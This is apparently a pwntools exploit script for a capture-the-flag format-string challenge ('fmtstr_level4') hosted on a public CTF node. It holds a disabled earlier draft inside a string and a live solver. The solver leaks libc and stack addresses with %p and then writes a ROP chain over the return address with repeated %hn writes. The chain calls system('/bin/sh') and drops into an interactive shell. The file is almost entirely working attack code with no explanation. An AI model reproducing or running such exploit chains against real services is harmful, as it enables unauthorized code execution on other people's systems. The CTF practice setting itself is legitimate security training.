from pwn import *

"""
from LibcSearcher import *
from ae64 import AE64

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "split", "-h"]
# context(arch="amd64",os="linux",log_level="debug")
binary = "./fmtstr_level4/fmtstr_level4"
libc_addr = "./fmtstr_level4/libc.so.6"
ld_addr = "../../glibc-all-in-one/libs/2.31-0ubuntu9_i386/ld-2.31.so"

rop = ROP(binary)
elf = ELF(binary)

libc = ELF(libc_addr)
ld = ELF(ld_addr)
# libc_dll = cdll.LoadLibrary(libc)


local = 1

ip, port = "61.147.171.105", 23751
# ip, port = "chall.pwnable.tw" 1
if local == 0:
    p = process(binary)
    dbg = lambda p: gdb.attach(p)
    libc_addr = "/lib/x86_64-linux-gnu/libc.so.6"
    libc = ELF(libc_addr)
else:
    # p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    # p = remote("node5.buuoj.cn", port)
    p = remote("node5.anna.nssctf.cn", port)
    dbg = lambda _: None


ls = lambda addr: log.success(hex(addr))


def search(func_name: str, func_addr: int):
    log.success(func_name + ": " + hex(func_addr))
    libc = LibcSearcher(func_name, func_addr)
    offset = func_addr - libc.dump(func_name)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


def search_from_libc(func_name: str, func_addr: int, libc=libc):
    log.success(func_name + ": " + hex(func_addr))
    offset = func_addr - libc.symbols[func_name]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


# __libc_start_main

csu_start = 0x0


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csu_start):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(r12)  # r12
    payload += p64(edi)  # edi
    payload += p64(rsi)  # rsi
    payload += p64(rdx)  # rdx
    payload += p64(start)
    payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


# =================start=================#
printf_got = elf.got.printf  # 0x404030
buf_addr = 0x4040C0

p.sendlineafter(b"answer: ", b"y")


def con(content):
    p.sendlineafter(b"> \n", str(1).encode())
    p.sendlineafter(b"> \n", content)


# ret offset ==> 9
# stack 10 ====> 40 ====> 41

# payload=fmtstr_payload(7,{printf_got:system_plt})
# payload = fmtstr_payload(8, {printf_got: sys}, write_size="byte", numbwritten=0xA)

# payload += b"%41$p"


con(b"%10$p|")

p.recvuntil(b"0x")
stack_ptr = int(p.recvuntil(b"|", drop=True), 16)
stack_ptr_ptr = stack_ptr + 0x8
ret_addr = stack_ptr - 0x100 + 0x8
ls(stack_ptr)
ls(stack_ptr_ptr)
addr_end = stack_ptr_ptr & 0xFF
ls(addr_end)

payload = b"%48c%40$hhn"
con(payload)

payload = b"%" + str(addr_end + 1).encode() + b"c%10$hhn"
con(payload)
payload = b"%64c%40$hhn"
con(payload)


payload = b"%" + str(addr_end + 2).encode() + b"c%10$hhn"
con(payload)
payload = b"%64c%40$hhn"
con(payload)

payload = b"%41$s|"
con(payload)

libc_offset = u64(p.recvuntil(b"|", drop=True).ljust(8, b"\0")) - libc.sym.printf
ls(libc_offset)

off = 0xEBCF1
off = 0xEBCF5
off = 0xEBCF8
off = 0xEBD52
off = 0xEBDA8
off = 0xEBDAF
off = 0xEBDB3
one = off + libc_offset

ls(ret_addr)

ret1 = ret_addr & 0xFFFF
ret2 = (ret_addr & 0xFFFF0000) >> 16
ret3 = (ret_addr & 0xFFFF00000000) >> 32

payload = b"%" + str(addr_end).encode() + b"c%10$hhn"
con(payload)
payload = b"%" + str(ret1).encode() + b"c%40$hn"
con(payload)


payload = b"%" + str(addr_end + 2).encode() + b"c%10$hhn"
con(payload)
payload = b"%" + str(ret2).encode() + b"c%40$hn"
con(payload)

payload = b"%" + str(addr_end + 4).encode() + b"c%10$hhn"
con(payload)
payload = b"%" + str(ret3).encode() + b"c%40$hn"
con(payload)

ret_addr_end = ret_addr & 0xFF


one1 = one & 0xFFFF
one2 = (one & 0xFFFF0000) >> 16
one3 = (one & 0xFFFF00000000) >> 32

payload = b"%" + str(one1).encode() + b"c%41$hn"
con(payload)

payload = b"%" + str(addr_end).encode() + b"c%10$hhn"
con(payload)
payload = b"%" + str(ret_addr_end + 2).encode() + b"c%40$hhn"
con(payload)
payload = b"%" + str(one2).encode() + b"c%41$hn"
ls(one)
con(payload)
sys1 = sys & 0xFFFF
sys2 = (sys & 0xFFFF0000) >> 16
sys3 = (sys & 0xFFFF00000000) >> 32

ls(sys1)
ls(sys2)
ls(sys3)


# ls(printf_got)
payload = b"%" + str(sys1).encode() + b"c%41$hn"
con(payload)

payload = b"%25c%40$hhn"
con(payload)
payload = b"%" + str(sys2).encode() + b"c%41$hn"
con(payload)

payload = b"%26c%40$hhn"
con(payload)
payload = b"%" + str(sys3).encode() + b"c%41$hn"
con(payload)
# fmtstr_number = str(addr_end).encode()

dbg(p)
p.interactive()

"""

from struct import pack
from ctypes import *
from LibcSearcher import *


def s(a):
    p.send(a)


def sa(a, b):
    p.sendafter(a, b)


def sl(a):
    p.sendline(a)


def sla(a, b):
    p.sendlineafter(a, b)


def r():
    p.recv()


def pr():
    print(p.recv())


def rl(a):
    return p.recvuntil(a)


def inter():
    p.interactive()


def debug():
    gdb.attach(p)
    pause()


def get_addr():
    return u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))


def get_sb():
    return libc_base + libc.sym["system"], libc_base + next(libc.search(b"/bin/sh\x00"))


context(os="linux", arch="amd64", log_level="debug")
# p = process('./pwn')
# libc = ELF('./libc-2.27-x64.so')
elf = ELF("./fmtstr_level4/fmtstr_level4")
libc = ELF("./fmtstr_level4/libc.so.6")
ld_addr = "../../glibc-all-in-one/libs/2.31-0ubuntu9_i386/ld-2.31.so"

p = remote("node5.anna.nssctf.cn", 23751)

sla(b"answer: \n", b"y")

# laek libc_base
sla(b"> \n", b"1")
sa(b"> \n", b"%19$p")
libc_base = int(p.recv(14), 16) - 0x264040

# leak stack
sla(b"> \n", b"1")
sa(b"> \n", b"%13$p")
ret = int(p.recv(14), 16) - 0x110

# chang ret -> system(b'/bin/sh\x00')
rdi = libc_base + 0x2A3E5
system, binsh = get_sb()
ret_gadget = libc_base + 0x29CD6

# ret
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str(ret & 0xFFFF).encode() + b"c%13$hn")
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str(ret_gadget & 0xFFFF).encode() + b"c%43$hn")

sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((ret & 0xFFFF) + 2).encode() + b"c%13$hn")
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((ret_gadget >> 16) & 0xFFFF).encode() + b"c%43$hn")

sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((ret & 0xFFFF) + 4).encode() + b"c%13$hn")
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((ret_gadget >> 32) & 0xFFFF).encode() + b"c%43$hn")

# pop; rdi
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((ret + 8) & 0xFFFF).encode() + b"c%13$hn")
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str(rdi & 0xFFFF).encode() + b"c%43$hn")

sla(b"> \n", b"1")
sa(b"> \n", b"%" + str(((ret + 8) & 0xFFFF) + 2).encode() + b"c%13$hn")
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((rdi >> 16) & 0xFFFF).encode() + b"c%43$hn")

sla(b"> \n", b"1")
sa(b"> \n", b"%" + str(((ret + 8) & 0xFFFF) + 4).encode() + b"c%13$hn")
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((rdi >> 32) & 0xFFFF).encode() + b"c%43$hn")

# binsh
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((ret + 0x10) & 0xFFFF).encode() + b"c%13$hn")
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str(binsh & 0xFFFF).encode() + b"c%43$hn")

sla(b"> \n", b"1")
sa(b"> \n", b"%" + str(((ret + 0x10) & 0xFFFF) + 2).encode() + b"c%13$hn")
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((binsh >> 16) & 0xFFFF).encode() + b"c%43$hn")

sla(b"> \n", b"1")
sa(b"> \n", b"%" + str(((ret + 0x10) & 0xFFFF) + 4).encode() + b"c%13$hn")
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((binsh >> 32) & 0xFFFF).encode() + b"c%43$hn")

# system
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((ret + 0x18) & 0xFFFF).encode() + b"c%13$hn")
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str(system & 0xFFFF).encode() + b"c%43$hn")

sla(b"> \n", b"1")
sa(b"> \n", b"%" + str(((ret + 0x18) & 0xFFFF) + 2).encode() + b"c%13$hn")
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((system >> 16) & 0xFFFF).encode() + b"c%43$hn")

sla(b"> \n", b"1")
sa(b"> \n", b"%" + str(((ret + 0x18) & 0xFFFF) + 4).encode() + b"c%13$hn")
sla(b"> \n", b"1")
sa(b"> \n", b"%" + str((system >> 32) & 0xFFFF).encode() + b"c%43$hn")

# pwn
# gdb.attach(p, 'b *0x40134A')

sla(b"> \n", b"2")
inter()

print(" ret -> ", hex(ret))
print(" libc_base -> ", hex(libc_base))
pause()
